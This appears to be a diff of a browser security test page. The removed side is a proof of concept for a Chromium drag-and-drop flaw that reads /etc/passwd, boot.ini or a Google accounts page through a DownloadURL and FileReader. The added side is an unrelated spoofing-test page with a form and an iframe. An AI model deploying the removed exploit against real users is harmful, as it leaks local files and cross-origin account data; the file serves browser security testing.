@@ -1,76 +1,24 @@
-<!DOCTYPE html>
 <html>
 <head>
-<title>Chromium Drag-Drop File Read (Issue 40078973)</title>
+<style>body {background-color: green;}</style>
 </head>
 <body>
+    <p>Social news stuff here's a neat site.</p><a href="#" onclick="alert('foo')">HI</a>
+    
 
-<h2>Chromium Drag-and-Drop Local File Read</h2>
-<p>CVE: Chrome 33+ - Drag-drop grants file access via DownloadURL</p>
-
-<span id="dragme" style="padding:10px;background:#4285f4;color:#fff;cursor:move;display:inline-block">
-  DRAG ME
-</span>
-
-<br><br><br><br>
-
-<div id="dropzone" style="width:400px;height:100px;border:2px dashed #ccc;padding:20px;text-align:center;line-height:100px">
-  DROP HERE
-</div>
-
-<h3>File Contents:</h3>
-<textarea id="output" cols="80" rows="20"></textarea>
-
-<script>
-var dragElement = document.getElementById('dragme');
-var dropZone = document.getElementById('dropzone');
-var output = document.getElementById('output');
-
-// Make element draggable
-dragElement.draggable = true;
-
-// On drag start - set DownloadURL to target file
-dragElement.ondragstart = function(e) {
-  // Windows: Read boot.ini
-  // Linux: Read /etc/passwd
-  // Cross-origin: Read HTTPS pages
-
-  //var targetFile = "file:///etc/passwd"; // Linux
-  // var targetFile = "file:///C:/boot.ini"; // Windows
-  var targetFile = "https://accounts.google.com/"; // Cross-origin
-
-  e.dataTransfer.setData("DownloadURL", "application/octet-stream:target.txt:" + targetFile);
-  e.dataTransfer.effectAllowed = "copy";
-};
-
-// Allow drop
-dropZone.ondragover = function(e) {
-  e.preventDefault();
-  dropZone.style.background = "#e8f0fe";
-};
-
-dropZone.ondragleave = function(e) {
-  dropZone.style.background = "";
-};
-
-// On drop - read the file
-dropZone.ondrop = function(e) {
-  e.preventDefault();
-  dropZone.style.background = "#d4edda";
-
-  var file = e.dataTransfer.files[0];
-  if (!file) {
-    output.value = "No file received";
-    return;
-  }
-
-  var reader = new FileReader();
-  reader.onloadend = function() {
-    output.value = reader.result;
-  };
-  reader.readAsText(file);
-};
-</script>
+    <br/>
+    
+    <div style="float:left">
+    <form>
+    <input type="text"/> Name<br/>
+    <input type="text"/> Email<br/>
+    <br/>
+    Comment<br/>
+    <textarea rows="6" cols="50">Default comment or something</textarea>
+    </form>
+    </div>
+    <iframe id="foo" width="200" height="200" src="cr_scroll_content_spoofing2.html" ></iframe>
+    <a href="#">Fooo!</a>
 
 </body>
 </html>
